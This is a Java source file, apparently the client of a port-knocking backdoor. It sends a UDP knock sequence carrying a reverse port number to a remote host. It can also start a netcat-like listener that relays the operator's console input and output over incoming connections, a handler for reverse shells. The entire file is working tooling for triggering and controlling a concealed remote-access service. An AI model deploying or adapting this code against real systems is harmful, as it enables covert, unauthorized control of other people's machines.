package client;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.OutputStreamWriter;
import java.io.PrintWriter;
import java.net.DatagramPacket;
import java.net.DatagramSocket;
import java.net.InetSocketAddress;
import java.net.ServerSocket;
import java.net.Socket;
import java.net.SocketAddress;
import java.net.SocketException;
import java.net.UnknownHostException;
import java.util.ArrayList;
import java.util.List;
import java.util.Scanner;

import server.Server;

public class Client {

	public static final String FULL_USAGE = "Use the following format to run the program: java Client -h<remote host IP address> -p<comma separated port sequence> -r<port number> [-l]";
	public static final String REMOTE_HOST = "   -h<remote host IP address> to specifiy the remote host to send the knock sequence to";
	public static final String REVERSE_PORT = "   -r<port number> to specify a port the reverse connection should attempt to connect back on";
	public static final String LISTEN_USAGE = "   -l to create a listening socket to handle reverse connections";
	public static final String PORT_SEQUENCE_USAGE = "   -p<comma separated port sequence> to specifiy the knock sequence to send";
	private static final String LISTEN_PORT_SWITCH = "-l";
	private static final String REVERSE_PORT_SWITCH = "-r";
	public static final String REMOTE_HOST_SWITCH = "-h";

	/**
	 * @param args
	 */
	public static void main(String[] args) {

		/**
		 * By default don't create a listening socket.
		 */
		boolean useJNetCat = false;

		/**
		 * The ports to use for the knock sequence.
		 */
		final List<Integer> ports = new ArrayList<Integer>();

		/**
		 * The reverse port to make a connection to.
		 */
		int rPort;

		/**
		 * The remote host to connect to.
		 */
		String rhost;

		if (args.length < 3) {
			System.out.println(Client.FULL_USAGE);
			System.out.println(Client.REMOTE_HOST);
			System.out.println(Client.REVERSE_PORT);
			System.out.println(Client.PORT_SEQUENCE_USAGE);
			System.out.println(Client.LISTEN_USAGE);
			return;
		} else {
			// first get the remote host to connect to
			rhost = Server.findArgument(Client.REMOTE_HOST_SWITCH, args);
			if (rhost == "") {
				System.out.println("The remote host to connect to must be entered.");
				System.out.println(Client.FULL_USAGE);
				System.out.println(Client.REMOTE_HOST);
				System.out.println(Client.REVERSE_PORT);
				System.out.println(Client.PORT_SEQUENCE_USAGE);
				System.out.println(Client.LISTEN_USAGE);
				return;
			}

			// try getting the list of ports
			String portsString = Server.findArgument(Server.PORT_SEQUENCE_SWITCH, args);
			if (portsString == "") {
				System.out.println("Port sequence must be entered.");
				System.out.println(Client.FULL_USAGE);
				System.out.println(Client.REMOTE_HOST);
				System.out.println(Client.REVERSE_PORT);
				System.out.println(Client.PORT_SEQUENCE_USAGE);
				System.out.println(Client.LISTEN_USAGE);
				return;
			}

			try {
				Server.getPortSequenceList(portsString, ports);
			} catch (NumberFormatException e) {
				System.out.println("Invalid port sequence entered.");
				return;
			}

			// then try getting the reverse port
			String reversePortString = Server.findArgument(Client.REVERSE_PORT_SWITCH, args);
			if (reversePortString == "") {
				System.out.println("A reverse port must be entered");
				System.out.println(Client.FULL_USAGE);
				System.out.println(Client.REMOTE_HOST);
				System.out.println(Client.REVERSE_PORT);
				System.out.println(Client.PORT_SEQUENCE_USAGE);
				System.out.println(Client.LISTEN_USAGE);
				return;
			}

			try {
				rPort = Integer.parseInt(reversePortString);
			} catch (NumberFormatException e) {
				System.out.println("Invalid reverse port entered");
				return;
			}

			// last we see if they entered the listen switch

			for (String arg : args) {
				if (arg.startsWith(Client.LISTEN_PORT_SWITCH)) {
					useJNetCat = true;
				}
			}

		}

		DatagramSocket datagramSocket;

		// store this in a final to make my life easier.
		final int reversePort = rPort;

		try {
			if (useJNetCat) {

				// create a new thread to listen for a connection
				Thread t = new Thread(new Runnable() {
					public void run() {
						try {
							ServerSocket server = new ServerSocket(reversePort);

							while (true) {
								final Socket client = server.accept();

								// put the new connection in a thread
								Thread connection = new Thread(new Runnable() {
									public void run() {
										// create two treads. one to listen and
										// one
										// to write
										final Socket socket = client;

										Thread readThread;
										Thread writeThread;

										readThread = new Thread(new Runnable() {

											public void run() {
												try {
													BufferedReader in = new BufferedReader(new InputStreamReader(socket.getInputStream()));
													String currentLine = "";
													while ((currentLine = in.readLine()) != null) {
														System.out.println(currentLine);
														if (Thread.interrupted()) {
															return;
														}
													}
													System.out.println("Remote host closed the connection.");
												} catch (IOException e) {
													e.printStackTrace();
												} finally {
													// should probably close all the streams?
													System.exit(0);
												}
											}
										});

										writeThread = new Thread(new Runnable() {

											public void run() {
												try {
													Scanner sc = new Scanner(System.in);
													PrintWriter out = new PrintWriter(new OutputStreamWriter(socket.getOutputStream()));
													while (sc.hasNext()) {
														out.println(sc.nextLine());
														out.flush();
													}
												} catch (IOException e1) {
													e1.printStackTrace();
												}
											}
										});

										readThread.start();
										writeThread.start();
									}

								});
								connection.start();
							}

						} catch (IOException e) {
							e.printStackTrace();
						}

					}
				});
				t.start();
			}

			datagramSocket = new DatagramSocket();
			byte[] buffer = new String(reversePort + "").getBytes();

			for (int i = 0; i < ports.size(); i++) {
				SocketAddress receiverAddress = new InetSocketAddress(rhost, ports.get(i).intValue());
				DatagramPacket packet = new DatagramPacket(buffer, buffer.length, receiverAddress);

				datagramSocket.send(packet);
				System.out.println("Sent packet: " + ports.get(i).intValue());
			}

		} catch (SocketException e) {
			// TODO Cleanup?
			e.printStackTrace();
		} catch (UnknownHostException e) {
			// TODO Cleanup?
			e.printStackTrace();
		} catch (IOException e) {
			// TODO Cleanup?
			e.printStackTrace();
		}

	}
}
